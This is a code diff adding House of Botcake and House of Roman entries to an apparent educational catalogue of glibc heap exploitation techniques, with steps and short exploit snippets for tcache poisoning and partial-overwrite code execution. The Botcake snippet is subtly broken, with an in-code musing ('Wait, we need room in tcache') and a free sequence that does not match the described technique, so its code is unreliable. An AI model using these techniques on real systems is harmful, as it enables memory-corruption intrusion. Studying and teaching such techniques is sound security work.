@@ -577,6 +577,117 @@ free(overflow);`
     patchedIn: ['2.29+'],
     relatedTechniques: ['house-of-einherjar', 'unsorted-bin-attack']
   },
+
+  house_of_botcake: {
+    id: 'house-of-botcake',
+    name: 'House of Botcake',
+    description: 'Bypass tcache double-free mitigations (glibc 2.29+) by leveraging chunk consolidation.',
+    category: 'house',
+    vulnerability: 'UAF/Double Free allowing consolidation with a chunk that is subsequently freed to tcache.',
+    glibcVersions: ['2.29-2.31+'],
+    prerequisites: [
+      'Ability to allocate chunks larger than tcache max (0x408) OR ability to consolidate chunks',
+      'Ability to free 7 chunks to fill tcache',
+      'UAF or double free vulnerability'
+    ],
+    constraints: [
+      'Requires ability to allocate/free multiple chunks to manipulate tcache counts',
+      'Requires overlapping chunks execution post-consolidation'
+    ],
+    steps: [
+      '1. Allocate 7 chunks of size X to fill the tcache for size X.',
+      '2. Allocate chunk A and adjacent chunk B (where A+B form a consolidateable block).',
+      '3. Free B, then free A (or vice versa) to trigger consolidate into a large unsorted chunk.',
+      '4. Free A again (or use a UAF to free an overlapping smaller chunk). Since tcache is full, it might bypass checks, or you free it when tcache has room, placing a chunk that is inside the consolidated block into the tcache.',
+      '5. Allocate from the consolidated block to overwrite the tcache chunk\'s fd pointer.',
+      '6. Allocate twice from tcache to get arbitrary memory.'
+    ],
+    exploitationPath: [
+      {
+        name: 'Tcache Poisoning via Consolidation',
+        description: 'Bypass double free checks by hiding the double free inside a consolidated chunk',
+        code: `// Fill tcache
+for(int i=0; i<7; i++) {
+  void *p = malloc(0x100);
+  free(p);
+}
+
+// Allocate adjacent chunks
+void *prev = malloc(0x100);
+void *p = malloc(0x100);
+
+// Consolidate them into unsorted bin
+free(prev);
+free(p); // Now prev and p are merged into a 0x200+ chunk
+
+// But we still have a pointer to 'p'. 
+// Free it again! (Since it's part of a larger chunk now, tcache dup check fails to find it)
+// Wait, we need room in tcache. Let's assume we allocated one from tcache earlier.
+free(p); // Goes to tcache!
+
+// Now we allocate the large consolidated chunk
+void *large = malloc(0x200); 
+// large overlaps with p! We can overwrite p->fd
+*(uint64_t*)large = target_address;
+
+malloc(0x100); // Gets p
+void *target = malloc(0x100); // Gets target_address!`
+      }
+    ],
+    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c',
+    dhavalkapilChapter: '',
+    ctfChallenges: [
+      { name: 'Deconstruct.f CTF 2021', year: '2021', link: '' }
+    ],
+    difficulty: 'Hard',
+    patchedIn: [],
+    relatedTechniques: ['tcache-poisoning']
+  },
+
+  house_of_roman: {
+    id: 'house-of-roman',
+    name: 'House of Roman',
+    description: 'A leakless heap exploitation technique that relies on partial overwrites of heap and libc pointers to bypass ASLR.',
+    category: 'house',
+    vulnerability: 'Heap vulnerability (UAF/overflow) combined with partial overwrites (usually 1 or 2 bytes).',
+    glibcVersions: ['2.23-2.29'],
+    prerequisites: [
+      'UAF or Heap Overflow allowing partial byte overwrites',
+      'No libc leak available'
+    ],
+    constraints: [
+      'Requires brute-forcing 4 bits (1/16) or 12 bits (1/4096) of ASLR depending on alignment',
+      'Typically needs an environment where the exploit can be run multiple times or a script to loop it'
+    ],
+    steps: [
+      '1. Use Fastbin Dup to align a chunk near __malloc_hook using partial overwrite of the fd pointer.',
+      '2. Use Unsorted Bin attack to write a libc pointer (main_arena+offset) near __malloc_hook.',
+      '3. Partially overwrite that libc pointer to point exactly to __malloc_hook or system/one_gadget.',
+      '4. Trigger malloc to get a shell.'
+    ],
+    exploitationPath: [
+      {
+        name: 'Leakless RCE via Partial Overwrite',
+        description: 'Overwrite LSBs of pointers to redirect execution without leaking base addresses',
+        code: `// Fastbin dup to point to malloc_hook - offset
+// We only overwrite the lowest byte to change offset within the same page
+*(uint8_t*)fastbin_chunk = 0xed; // e.g., pointing near malloc_hook
+
+// Unsorted bin attack to put main_arena+88 into our controlled chunk
+// Then partial overwrite of that libc pointer to point to one_gadget
+// Requires 12-bit bruteforce because of ASLR page alignment
+*(uint16_t*)libc_ptr = 0x1234; // Bruteforcing the nibble`
+      }
+    ],
+    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_roman.c',
+    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/heap_exploitation/house_of_roman',
+    ctfChallenges: [
+      { name: 'Codegate CTF 2018: BaskinRobbins31', year: '2018', link: '' }
+    ],
+    difficulty: 'Expert',
+    patchedIn: ['2.29+'],
+    relatedTechniques: ['fastbin-dup', 'unsorted-bin-attack']
+  }
 };
 
 export const HEAP_CATEGORIES = {
